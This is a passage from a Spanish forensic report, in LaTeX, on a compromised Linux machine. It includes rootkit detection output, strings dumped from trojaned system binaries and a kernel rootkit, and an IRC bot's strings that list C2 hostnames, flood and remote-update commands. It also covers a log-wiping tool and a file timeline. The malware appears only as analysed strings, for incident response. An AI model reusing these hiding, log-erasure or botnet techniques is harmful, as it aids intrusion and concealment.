root      7728  0.0  0.0  1280  248 tty3     T    21:32   0:00          \_ /bin/egrep -v egrep|dnsquery
                |-bash|linux|sysinit|db|identd|plogd|screen|ecko|popclean|popclean|ps PWD=/root HZ=100 
                USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=2 HUSHLOGIN=FALSE SHELL=/bin/bash 
                TERM=linux HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
                /usr/bin/X11 _=/bin/egrep
root      7729  0.0  0.0     0    0 tty3     Z    21:32   0:00              \_ [egrep <defunct>]

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Aqu'i aparecen l'ineas muy interesantes. Aparece el n'umero de proceso,
los comandos ejecutados, el usuario que lo ejecut'o, la hora de
ejecuci'on y el \verb+PATH+ del usuario que ejecut'o este comando, adem'as de
mostrar desde donde se conecto qu'ien lo corri'o, es decir, si alguien
entr'o al sistema y ejecut'o un programa el \verb+PATH+ del usuario aparecer'a
como signo inequ'ivoco de la paternidad y propiedad del proceso. El
usuario ven'ia desde la m'aquina llamada \verb+victima2+ y corri'o esos procesos
intencionalmente.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
duende  12689  0.0  0.0  1284  252 ?        T    07:43   0:00 
                /bin/egrep -v egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko
                |popclean|popclean|ps PWD=/dev/zqft4 VENDOR=intel REMOTEHOST=victima2.foo.bar.mx 
                MOZILLA_HOME=/usr/local/netscape OPENWINHOME=/usr/openwin USER=duende MACHTYPE=i386
	        MAIL=/var/mail/duende LANG=C HOST=victima1 SSH_CLIENT=xxx.xxx.xxx.2 33996 22 
                LOGNAME=duende SHLVL=2 GROUP=unknown SHELL=/bin/tcsh HOSTTYPE=i386-linux 
                OSTYPE=linux HOME=/home/staff/duende TERM=vt100 PATH=/bin:/usr/bin:/usr/local/bin
                :/usr/X11R6/bin:.:/home/staff/duende/prog/bin:/usr/local/bin:/opt/kde/bin
                :/home/staff/duende/bin SSH_TTY=/dev/pts/3 _=/bin/egrep
duende  12690  0.0  0.0     0    0 ?        Z    07:43   0:00  \_ [egrep <defunct>]
duende  14928  0.0  0.0  1284  252 ?        T    10:04   0:00 /bin/egrep -v egrep|dnsquery|-bash
                |linux|sysinit|db|identd|plogd|screen|ecko|popclean|popclean|ps PWD=/home/staff/duende
                VENDOR=intel REMOTEHOST=victima2.foo.bar.mx MOZILLA_HOME=/usr/local/netscape 
                OPENWINHOME=/usr/openwin USER=duende MACHTYPE=i386 MAIL=/var/mail/duende LANG=C 
                HOST=victima1 SSH_CLIENT=xxx.xxx.xxx.2 34041 22 LOGNAME=duende SHLVL=2 GROUP=unknown 
                SHELL=/bin/tcsh HOSTTYPE=i386-linux OSTYPE=linux HOME=/home/staff/duende TERM=vt100 
                PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:.:/home/staff/duende/prog/bin
               :/usr/local/bin:/opt/kde/bin:/home/staff/duende/bin SSH_TTY=/dev/pts/9 _=/bin/egrep
duende  14929  0.0  0.0     0    0 ?        Z    10:04   0:00  \_ [egrep <defunct>]
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Los procesos anteriores ejecutan un script que corre varios programas
simult'aneos entre ellos popclean el cual sabemos que es en realidad
dsniff. Adem'as muestran el \verb+PATH+ del usuario, quien se conecto desde la
m'aquina \verb+xxx.xxx.xxx.2+. El programa no se inicio solo o autom'aticamente, sino que primero se
accedi'o al equipo desde la \verb+xxx.xxx.xxx.2+ y luego se ejecut'o de forma intencional.


 Para revisar si otros programas aparte de \verb+ps+ y \verb+pstree+ est'an
troyanizados corremos el paquete chkrootkit. Por medio de las
utilidades que contiene chkrootkit someteremos a diversas pruebas y
retos el sistema para validar la autenticidad de los archivos del
sistema.


 Resultados de \verb+chkrootkit+:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Checking `basename'... INFECTED
Checking `biff'... INFECTED
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... INFECTED
Checking `date'... INFECTED
Checking `du'... not infected
Checking `dirname'... INFECTED
Checking `echo'... INFECTED
Checking `egrep'... not infected
Checking `env'... INFECTED
Checking `find'... not infected
Checking `grep'... INFECTED
Checking `hdparm'... not found
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... INFECTED
Checking `inetdconf'... INFECTED
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... not infected
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not infected
Checking `netstat'... INFECTED
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not infected
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not infected
Checking `sshd'... not infected
Checking `syslogd'... not infected
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not infected
Checking `traceroute'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... /tmp/982235016-gtkrc-429249277 
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... nothing found
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for OBSD rk v1... nothing found
Searching for LOC rootkit ... nothing found
Searching for Romanian rootkit ... nothing found
Searching for anomalies in shell history files... nothing found
Checking `asp'... not infected
Checking `bindshell'... not infected
Checking `lkm'... You have    11 process hidden for ps command
Warning: Possible LKM Trojan installed
Checking `rexedcs'... not found
Checking `sniffer'... 
Checking `wted'... Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... 
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 \verb+chkrootkit+ nos informa de la evidencia de infecci'on con c'odigo no
est'andar en distintos programas, algunos de ellos son de la propiedad
de duende como se mostr'o al principio del documento. De cualquier forma
se har'a una revisi'on detallada de cada uno de los programas de los cuales
se sospeche su autenticidad.

 \verb+chkrootkit+ nos dice que posiblemente este instalado un {\bf Loadable
Kernel Module} (LKM) que ocultaba 11 procesos al momento de la revisi'on. 
Esto quiere decir, que pueden existir archivos que no se ven con el sistema 
funcionando si esta corriendo el LKM. Se sospechaba de antemano de la presencia 
de un LKM pues hab'ia una referencia a \verb+/sbin/init!+ el que no aparece en los
listados que se obtuvieron.

 
\subsection*{An'alisis {\em post-mortem}}


 Desde que se sembraron los programas de registro se hizo una copia
completa del sistema, y antes del an'alisis forense se generaron varias
copias id'enticas bit a bit de los discos duros. Salvo por necesidad
se trabajo en el disco original si era meritorio. La copia de las
particiones del disco duro se analiz'o en sistemas limpios y
controlados.

\subsubsection*{Sistemas de an'alisis y referencia}


{\bf Dell precision 350}\\
Pentium 4 2.8 GHz\\
512 MB RAM\\
DD 80 GB\\
Debian GNU/Linux Woody (referencia.)\\
Debian GNU/linux Sarge (an'alisis.)\\

{\bf Dell inspiron 4150}\\
Pentium 4 1.8 GHz\\
256 MB RAM\\
DD 30 GB\\
Debian GNU/Linux Woody (referencia.)\\
Debian GNU/linux Sarge (an'alisis.)\\


{\bf Programas usados para el an'alisis}\\



\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

-- strings 
								  
-- strace 

-- ltrace

-- gdb

-- find 

-- md5sum

-- netstat 

-- /usr/sbin/lsof 

-- grep 

-- dd 

-- export 

-- chkrootkit 

-- icat 

-- file 
    
-- readelf 

-- objdump 
   
-- ps 
    
-- nc 
    
-- stat 

-- nm 

-- unrm 

-- mactime 

-- sleuthkit

-- autopsia

-- entropy

-- gcc

-- f-prot 

-- lsattr

-- lazarus

-- dcat                            

-- dls                              

-- dstat                            

-- ffind                            

-- file                             

-- fls                              

-- fsstat                           

-- hfind                            

-- icat                             

-- ifind                            

-- ils                              

-- istat                            

-- mactime                          

-- md5                              

-- sha1                             

-- sorter

-- grave-robber

-- lastcomm

-- major_minor

-- timeout

-- bdf                                                      

-- ils2mac  
                                          
-- realpath

-- check_wtmpx                                          

-- chkdirs                                                   

-- chklastlog                                                

-- chkpro                                                  

-- chkproc                                                  

-- chkwtmp                                                  

-- ifpromisc                                                

-- snif                                                     

-- last

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm



 Primero se revisaron los programas reportados por \verb+chkrootkit+ como
troyanizados. En total se estudiaron 1999 programas
en el 'arbol de directorios del sistema.\\

 \verb+/bin/ps+\\
 
 An'alisis de cadenas de texto:
 
 
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/lib/ld-linux.so.2
libc.so.6
strcpy
fgets
system
feof
malloc
__deregister_frame_info
setgid
strcmp
sprintf
fclose
fopen
_IO_stdin_used
__libc_start_main
strlen
setuid
__register_frame_info
__gmon_start__
GLIBC_2.1
GLIBC_2.0
PTRh
$Id: ps.c,v 1.11 2001/09/03  Exp $
[1;33m%s
/bin/su -
/dev/.libpt
egrep
%s|%s
%sps
%s %s
/dev/.pst
%s%s | /bin/egrep -v "%s"
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 De estas cadenas lo sobresaliente es que el programa lee \verb+/dev/.libpt+
y luego con egrep filtra los procesos que lee en ese
archivo. Definitivamente estos programas est'an troyanizados con el fin de
ocultar la informaci'on que se le indique a voluntad o de forma
autom'atica.


\verb+/bin/netstat+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/bin/su -
/dev/.libn
egrep
%s|%s
%sps
%s %s
/dev/.nst
%s%s | /bin/egrep -v "%s"
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 El anterior programa lee \verb+/dev/.nst+ y oculta el estado de la red seg'un
 se le ordene.
 

\verb+/usr/bin/pstree+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/bin/su -
/dev/.libtr
egrep
%s|%s
%sps
%s %s
/dev/.tree
%s%s | /bin/egrep -v "%s"
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 El anterior lee \verb+/dev/.libtr+ y oculta procesos.
 
 
\verb+/bin/init+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Can't open a tty, all in use ?
Can't fork subshell, there is no way...
/dev/zqft4
/bin/sh
Can't execve shell!
BD_Init: Starting backdoor daemon...
FUCK: Can't allocate raw socket (%d)
FUCK: Can't fork child (%d)
Done, pid=%d
/dev/zqft4/.rc
use:
%s <uivfp> [args]
u       - uninstall
i       - make pid invisible
v       - make pid visible
f [0/1] - toggle file hiding
p [0/1] - toggle pid hiding
Detected version: %s
FUCK: Failed to uninstall (%d)
Suckit uninstalled sucesfully!
FUCK: Failed to hide pid %d (%d)
Pid %d is hidden now!
FUCK: Failed to unhide pid %d (%d)
Pid %d is visible now!
file
Failed to change %s hiding (%d)!
%s hiding is now %s!
kmalloc
_kmalloc
__kmalloc
/dev/zqft4
/dev/kmem
FUCK: Can't open %s for read/write (%d)
RK_Init: idt=0x%08x,
FUCK: IDT table read failed (offset 0x%08x)
FUCK: Can't find sys_call_table[]
sct[]=0x%08x,
FUCK: Can't find kmalloc()!
kmalloc()=0x%08x, gfp=0x%x
FUCK: Can't read syscall %d addr
Z_Init: Allocating kernel-code memory...
FUCK: Out of kernel memory!
Done, %d bytes, base=0x%08x
/dev/kmem
/dev/null
core
FUCK: Got signal %d while manipulating kernel!
/sbin/init!
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
<NULL>
'Yi
/dev/null
1.3b
/dev/zqft4/.sniffer
/proc/
/proc/net/
socket:[
/sbin/init
/sbin/init!
login
telnet
rlogin
rexec
passwd
adduser
mysql
ssword:
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Esas cadenas se parecen a las de \verb+/dev/zqft4/sk+ ya antes mencionado,
as'i que se calculara su suma \verb+md5sum+ que es una n'umero 'unico de
identificaci'on para cada archivo basado en an'alisis y sumas bit a
bit.  Si los n'umeros coinciden para dos archivos, estos son iguales.

 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
 4237949f8b00fc64feb9b575a5f6e1dc  /dev/zqft4/sk

 4237949f8b00fc64feb9b575a5f6e1dc  /sbin/init
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm



 Los dos archivos son el mismo.
 
 En este programa existen l'ineas que explican el origen de varios
archivos estudiados. Tambi'en se ve que una de sus funciones es ocultar
procesos autom'aticamente y que llama a un programa de nombre
\verb+/sbin/init!+  entre otras caracter'isticas. Otra funci'on m'as es hacer invisibles
a los archivos con \verb+!+ al final de su nombre.

 Se buscaron otros archivos ocultos con el signo de admiraci'on al
final de su nombre y se encontraron los siguientes:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
485151   28 -rwxr-xr-x   1 root     root        27844 Apr  8 11:02 /sbin/init!
533481   32 -rwxr-xr-x   1 root     root        31707 Apr  8 11:02 /dev/zqft4/bash!
533491    4 -rw-r--r--   1 root     root           90 Apr 16 11:56 /dev/zqft4/bd!
533485   28 -rwxr-xr-x   1 1018     1018        25163 Aug  4  2002 /dev/zqft4/local!
533488   12 -rwxr-xr-x   1 root     root         9602 Apr  8 11:02 /dev/zqft4/clean!
533490    4 -rwxr-xr-x   1 root     root           90 Apr 16 11:40 /dev/zqft4/smurf!
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Revisaremos estos programas.\\

\verb+/sbin/init!+\\

Tipo de archivo:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/sbin/init!: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.30, 
dynamically linked (uses shared libs), stripped
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Al revisar las cadenas de texto no encontramos nada extra�o, y
comparando sus sumas binarias se encontr'o que es el mismo \verb+/sbin/init+
de un sistema limpio. Parece que su funci'on es la de correr el
init troyanizado.\\


\verb+/dev/zqft4/bash!+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
ka0sphere.freeftp.org
ka0sphere.getmyip.com
ka0sphere.zapto.org
ka0sphere.sytes.net
ka0sphere.servequake.com
ka0sphere.servepics.com
ka0sphere.servemp3.com
ka0sphere.serveirc.com
ka0sphere.servehttp.com
ka0sphere.servehalflife.com
ka0sphere.servegame.com
ka0sphere.serveftp.com
ka0sphere.servecounterstrike.com
ka0sphere.servebeer.com
ka0sphere.redirectme.net
ka0sphere.no-ip.org
ka0sphere.no-ip.info
ka0sphere.no-ip.com
ka0sphere.no-ip.biz
ka0sphere.myvnc.com
ka0sphere.myftp.org
ka0sphere.myftp.biz
ka0sphere.hopto.org
ka0sphere.bounceme.net
ka0sphere.3utilities.com
ka0sphere.mine.nu
ka0sphere.kicks-ass.org
ka0sphere.is-a-geek.org
ka0sphere.homeunix.com
ka0sphere.gotdns.com
cha0sphere.theroots.la
cha0sphere.phearnet.org
cha0sphere.hackerzlair.org
cha0sphere.flooooooooooooooood.la
cha0sphere.evilnet.la
NOTICE %s :Someone needs a miracle
NOTICE %s :BYSIN <target> <port> <secs>
NOTICE %s :Packeting %s.
NOTICE %s :SLICE2 <destination> <lowport> <highport> <secs>
NOTICE %s :Error in SLICE2: Low > high.
cant find %s!
NOTICE %s :PAN <target> <secs>
NOTICE %s :Panning %s.
NOTICE %s :MAJIN <target> <secs>
NOTICE %s :Majin'n %s.
NOTICE %s :UPDATE <host> <port> <username> <pass> <src:bin>
NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).
NOTICE %s :Unable to resolve address.
NOTICE %s :Unable to connect to dump site.
220 
NOTICE %s :Error while logging in to dump: %s
USER %s
331 
PASS %s
230 
REST 0
gcc --help
Usage
TYPE I
200 
NOTICE %s :GCC not found and cannot create passive binary mode: %s
PASV
227 
NOTICE %s :Error while starting passive to dump: %s
RETR %s
NOTICE %s :Unable to create socket.
NOTICE %s :Unable to connect to streamed dump site.
NOTICE %s :Receiving update.
mkdir /tmp
/tmp/.c
(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; kill -9 %d; %s &) > /dev/null
/tmp/.o
(mv /tmp/.o %s; chmod 755 %s; kill -9 %d; kill -9 %d; %s &) > /dev/null
NOTICE %s :UPDATEHTTP <host> <src:bin>
NOTICE %s :Unable to connect to http.
GET /%s HTTP/1.0
Connection: Keep-Alive
User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)
Host: %s:80
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1
(mv /tmp/.o %s; chmod 755 %s; kill -9 %d; %s &) > /dev/null
NOTICE %s :GET <host> <save as>
http://
NOTICE %s :Receiving file.
NOTICE %s :Saved as %s
kill -9 %d;kill -9 0
NOTICE %s :Killing pid %d.
KILL
KILLALL
VERSION
SLICE2
MAJIN
UPDATE
UPDATEHTTP
chrysaor
kamikaze
cha0sphere
eCliPs
CaRb0nE
IRC 
#leming
PRIVMSG %s :%s
MODE %s +ix %s
inside.l3ming
JOIN %s :%s
MODE %s +tnmsk %s
WHO %s
PONG %s
NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.
leming
NICK %s
PING
PRIVMSG
/etc/rc.d/rc.local
"%s%s"
"%s%s"
Someone needs a miracle
cr4sh
NICK %s
USER %s localhost localhost :%s
ERROR
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Parece ser que el anterior {\bf shell} tiene agregadas funciones de conexi'on
por medio de la red.\\
 

\verb+/dev/zqft4/local!+\\


Este programa se ejecut'o en un sistema de pruebas, con el resultado
de un da�o en el arranque del sistema. Al parecer se debe correr en
combinaci'on con otros programas y no de manera individual.\\


\verb+/dev/zqft4/clean!+\\

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/var/log/messages
/var/log/secure
/var/log/xferlog
/var/log/maillog
messages.hm
secure.hm
xferlog.hm
maillog.hm
HideMe
Usage: %s <user> <host> <IP>
/var/run/utmp
Uh ? utmp target not locked. Getting outta here.
utmp target processed.
/var/log/wtmp
Uh? wtmp target not locked. Getting outta here.
wtmp.hm
Damn! Problems targeting wtmp. Getting outta here.
/bin/mv wtmp.hm /var/log/wtmp
Ach. Couldn't replace %s .
/bin/chmod 644 /var/log/wtmp
wtmp target processed.
/var/log/lastlog
Uh? lastlog target not locked. Getting outta here.

lastlog target processed.
Processing %s
Hmmm. Couldn't reach var ...
                DONE.
mv messages.hm /var/log/messages
mv secure.hm /var/log/secure
mv xferlog.hm /var/log/xferlog
mv maillog.hm /var/log/maillog
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Este programa elimina los registros del sistema que se le indiquen a
voluntad del intruso o de manera automatizada.
 
 Es de destacar que al parecer estos programas ocultos deben de ser ejecutados
directamente desde la l'inea de comandos o desde un script para que funcionen.  
Es muy com'un que los atacantes no sepan que esos programas est'an instalados 
pues est'an ocultos por el sistema y ni ellos se percatan de su existencia si 
no conocen de antemano el kit usado.
 

\subsection*{B'usqueda y an'alisis de programas troyanizados usando antivirus}

 
Muchos programas revisados muestran informaci'on y cadenas no
convencionales por esto se analiz'o toda la m'aquina con un
antivirus. Los archivos que contienen virus para windows se omiten del
reporte, pues es com'un que los usuarios los tengan en sus cuentas al llegar 
en correos o en programas bajados desde internet. En
linux los virus no son importantes y lo que se pretende es buscar
archivos con troyanos y gusanos hechos para linux y que pueden ser detectados 
por un antivirus.\\



 Ejemplos ilustrativos de los resultados de la revisi'on hecha por \verb+f-prot+ 
a 181,711 archivos y programas:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
/root/usr/bin/last  Infection: Unix/RST.A
/root/usr/bin/strace  Infection: Unix/RST.A
/root/sbin/killall5  Infection: Unix/RST.A
/root/sbin/sulogin  Infection: Unix/RST.A
/root/bin/ps  Infection: Unix/RST.A
/root/dev/zqft4/local!  Infection: Unix/Osf.A
/home/staff/duende/paw++  Infection: Unix/RST.B
/home/staff/duende/prog/c/lc/une  Infection: Unix/RST.B
/home/staff/duende/prog/c/lc/linfo  Infection: Unix/RST.A
/home/staff/duende/prog/c/lc/mapea  Infection: Unix/RST.A
/home/staff/duende/prog/c/lc/particion  Infection: Unix/RST.A
/home/staff/duende/prog/c/lc/correlacion  Infection: Unix/RST.A
/home/staff/duende/prog/c/uno/cadena  Infection: Unix/RST.A
/home/staff/duende/prog/c/uno/arbol  Infection: Unix/RST.A
/home/staff/duende/prog/c/uno/arboles  Infection: Unix/RST.A
/home/staff/duende/prog/c/uno/repite  Infection: Unix/RST.A
/home/staff/duende/prog/c/uno/simotu  Infection: Unix/RST.A
/home/staff/duende/prog/GL/avion  Infection: Unix/RST.A
/home/staff/duende/prog/bin/une  Infection: Unix/RST.A
/home/staff/duende/prog/bin/normal  Infection: Unix/RST.A
/home/staff/duende/prog/gtk/ghello  Infection: Unix/RST.A
/home/staff/duende/prog/gtk/registro.old  Infection: Unix/RST.A
/home/staff/duende/kxterm  Infection: Unix/RST.A
/home/staff/duende/installer-redhat-70-i386  Infection: Unix/RST.A



Results of virus scanning:

Files: 190937
MBRs: 0
Boot sectors: 0
Objects scanned: 181711
Infected: 1111
Suspicious: 4
Disinfected: 0
Deleted: 0
Renamed: 0

Time: 55:33
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

De estos resultados, se encontraron cerca de 900 programas
troyanizados con gusanos que abren conexiones de red y dan acceso a
la m'aquina en diversos puertos. Fueron encontrados 115 programas infectados
en el directorio de duende principalmente en carpetas
que supuestamente contienen trabajo de investigaci'on. Las fechas de
modificaci'on de estos programas son de abril 24 pero los fuentes
correspondientes tienen fechas del 2001. Casi todos los programas esenciales en
los directorios de sistema est'an troyanizados. Hay que destacar que
las infecciones en linux no son autom'aticas y no se puede decir que
se infectaron solos por contacto. Los programas fueron infectados con cadenas
binarias de forma intencional y con claro acceso a la cuenta de
root. En un sistema limpio no debe aparecer ning'un programa como
infectado como se verific'o en los sistemas de control.

\subsection*{Creaci'on de l'ineas de tiempo}

El siguiente paso es crear extraer las fechas y hora de modificaci'on,
acceso, creaci'on y borrado de todos los archivos almacenados en el disco duro.
Esta informaci'on se encuentra almacenada en los inodos y bloques de datos del disco.
Con esta informaci'on recolectada se ordenaron todos los 
archivos por la fecha de cualquier actividad relacionada con ese archivo.
Una vez hecho esto se creo la {\em l'inea de tiempo} de todos los archivos en el disco duro,
incluidos los que fueron borrados y que sus sectores en disco no han
sido sobreescritos. Estas l'ineas son de la forma:\\

D'ia de la semana mes d'ia del mes a�o hora tama�o
modificaci'on-acceso-cambio permisos due�o grupo archivo\\
 
 Ejemplo:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Mon Jun 03 1991 15:44:40  1060 m.. -/-rw-r--r-- root  root 356082 /usr/share/texmf/metapost/base/rboxes.mp
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Las l'ineas de tiempo de victima1 son 701,707 y fueron clasificadas en
orden cronol'ogico, as'i podemos reconstruir los sucesos sobre todos los
archivos en el disco ya sean recuperables o no.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Tue Apr 08 2003 16:00:05  3383242 m.. -/-rw-r--r-- root     root     147500   /var/cache/apt/archives/
                                                                              libc6_2.2.5-11.5_i386.deb
                          2390800 m.. -/-rw-r--r-- root     root     147497   /var/cache/apt/archives/
                                                                              libc6-dev_2.2.5-11.5_i386.deb
Tue Apr 08 2003 16:02:08    28472 m.. -/-rwxr-xr-x root     root     533487   /dev/zqft4/sk
                            27844 m.c -/-rwxr-xr-x root     root     485151   /sbin/init!
                            25163 ..c -/-rwxr-xr-x huet     1018     533485   /dev/zqft4/local!
                            28472 m.c -/-rwxr-xr-x root     root     485196   /sbin/init
Tue Apr 08 2003 16:02:20        0 .a. -/-rw-r--r-- root     root     307489   /usr/include/utmp.h.dpkg-tmp 
                                                                              (deleted)
                             9602 m.c -/-rwxr-xr-x root     root     533488   /dev/zqft4/clean!
                                0 .a. -rw-r--r-- root     root     307489   <victima1-root.img-dead-307489>
                                0 .a. -rw-r--r-- root     root     307490   <victima1-root.img-dead-307490>
                            31707 m.c -/-rwxr-xr-x root     root     533481   /dev/zqft4/bash!
                                0 .a. -/-rw-r--r-- root     root     307490   /usr/include/lastlog.h.
                                                                              dpkg-tmp (deleted)
Tue Apr 08 2003 16:02:45    34304 m.c -/-rw-r--r-- lester    502      787568   /home/staff/lester/tecnico.doc
Tue Apr 08 2003 16:07:27   260207 ..c -/-rw------- lester    502      1441938  /home/staff/lester/mail/conacyt
Tue Apr 08 2003 16:10:32    28472 ..c -/-rwxr-xr-x root     root     533487   /dev/zqft4/sk
Tue Apr 08 2003 16:11:17      236 m.c -/-rw------- root     mail     420675   /var/mail/.bash_history
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 De estas l'ineas se ve que varios de los programas estudiados fueron
modificados el 8 de abril a partir de las 16:02:08, es posible que
esta haya sido su fecha de creaci'on o instalaci'on.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

Fri Apr 11 2003 20:55:02     4096 m.c d/drwxr-xr-x root     root     243579   /var/lib/tmp
Fri Apr 11 2003 20:55:03    29220 ..c -/-rwxr-xr-x root     root     227122   /usr/bin/kevent
                            29220 ..c -/-rwxrwxr-x duende  users    388620   /bin/kevent
Fri Apr 11 2003 20:55:38    32768 m.c d/drwxr-xr-x root     root     402515   /dev/rd
                             4096 m.c d/drwxr-xr-x root     root     305831   /var/lib
                              475 m.c -/-rwxr-xr-x root     root     227370   /usr/bin/endl
                           711890 m.c -/-rwxr-xr-x root     root     227371   /usr/bin/sysinit
                              475 ..c -/-rwxr-xr-x duende  users    469100   /bin/endl
                              531 ..c -/-rwxr-xr-x duende  users    227352   /dev/rd/c6d0b2
                             4096 m.c d/drwxr-xr-x root     root     179262   /etc/tmp/socket
                             4096 m.c d/drwxr-xr-x root     root     565675   /etc/tmp
                              627 ..c -/-rwxr-xr-x duende  users    227351   /dev/rd/c2d3b2
                              512 ..c -/-rwxr-xr-x duende  users    227353   /dev/rd/c6d3b2
                                5 m.c -/-rw-r--r-- root     root     404745   /dev/rd/c0d0b1
Fri Apr 11 2003 20:55:39    58412 ..c -/-rwxr-xr-x root     root     241477   /dev/.pst
                               69 ..c f/-rwxr-xr-x duende  users    130461   /tmp/mc.pipe.12891 
			                                                      (deleted-realloc)
                               36 ..c -/-rwxr-xr-x duende  users    130454   /dev/.libn
                               69 ..c -/-rwxr-xr-x duende  users    130461   /dev/.libtr
                           395235 ..c -/-rwxr-xr-x duende  users    227367   /usr/lib/popclean
                             1013 ..c -/-rwxr-xr-x duende  users    227360   /usr/local/lib/
			                                                      dsniff.services
                               65 ..c -/-rwxr-xr-x duende  users    130458   /dev/.libtp
                               66 ..c -/-rwxr-xr-x duende  users    130456   /dev/.libpt
                              236 ..c -/-rwxr-xr-x duende  users    227358   /etc/cron.daily/dnsquery
                            17864 m.c -/-rwxr-xr-x root     root     356429   /var/lib/.identd/identd
                              115 m.c -/-rwxr-xr-x root     root     356431   /var/lib/.identd/libsnd
                             4060 m.c -/-rwxr-xr-x root     root     356428   /var/lib/.identd/libs
                            32236 ..c -/-rwxr-xr-x root     root     225524   /dev/.tp
                            86892 ..c -/-rwxr-xr-x root     root     241498   /dev/.nst
                            13224 ..c -/-rwxr-xr-x root     root     225715   /dev/.tree
Fri Apr 11 2003 21:13:23      240 ..c -/-rwxr-xr-x villasen users    324280   /bin/weit
